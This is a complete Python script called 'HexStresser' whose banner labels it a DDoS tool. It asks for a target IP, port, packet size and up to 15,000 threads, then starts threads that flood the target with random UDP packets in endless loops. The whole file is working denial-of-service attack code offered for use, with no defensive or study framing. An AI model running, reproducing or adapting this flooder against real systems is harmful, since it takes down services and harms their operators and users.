import socket
import threading
import random
import os
import time

# Clear screen
os.system('cls' if os.name == 'nt' else 'clear')

# Rainbow ANSI colors
colors = ['\033[91m', '\033[93m', '\033[92m', '\033[96m', '\033[94m', '\033[95m']
reset = '\033[0m'

# HexStresser Banner
banner = f"""{colors[0]}
██╗  ██╗███████╗██╗  ██╗███████╗████████╗██████╗ ███████╗███████╗███████╗███████╗██████╗ 
██║  ██║██╔════╝╚██╗██╔╝██╔════╝╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔════╝██╔════╝██╔══██╗
███████║█████╗   ╚███╔╝ ███████╗   ██║   ██████╔╝█████╗  ███████╗███████╗█████╗  ██████╔╝
██╔══██║██╔══╝   ██╔██╗ ╚════██║   ██║   ██╔══██╗██╔══╝  ╚════██║╚════██║██╔══╝  ██╔══██╗
██║  ██║███████╗██╔╝ ██╗███████║   ██║   ██║  ██║███████╗███████║███████║███████╗██║  ██║
╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
         {colors[2]}[ DDOS Tool | github.com/Hyezzcraxksz ]
{reset}"""

print(banner)
time.sleep(1)

# User input
target_ip = input(colors[1] + "[>] Target IP: " + reset)
target_port = int(input(colors[2] + "[>] Target Port: " + reset))
packet_size = int(input(colors[3] + "[>] Packet Size (bytes): " + reset))

# Handling threads safely
def get_thread_count():
    while True:
        try:
            threads = int(input(colors[4] + "[>] Number of Threads (1-15000): " + reset))
            if 1 <= threads <= 15000:
                return threads
            else:
                print(colors[0] + "[!] Please enter a value between 1 and 15,000." + reset)
        except ValueError:
            print(colors[0] + "[!] Invalid input. Please enter a number." + reset)

threads = get_thread_count()

def format_k(n):
    return f"{n / 1000:.1f}K" if n >= 1000 else str(n)

print(colors[5] + f"[+] Launching {format_k(threads)} threads..." + reset)

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(packet_size)
    while True:
        try:
            sock.sendto(payload, (target_ip, target_port))
            print(random.choice(colors) + f"[HexStresser] Sent packet to {target_ip}:{target_port}" + reset)
        except Exception as e:
            print(colors[0] + f"[!] Error: {e}" + reset)

# Launch threads
for i in range(threads):
    t = threading.Thread(target=udp_flood)
    t.daemon = True
    t.start()

    if i % 1000 == 0:
        print(colors[4] + f"[Thread {format_k(i)}] Running..." + reset)

# Keep the script alive
while True:
    time.sleep(1)
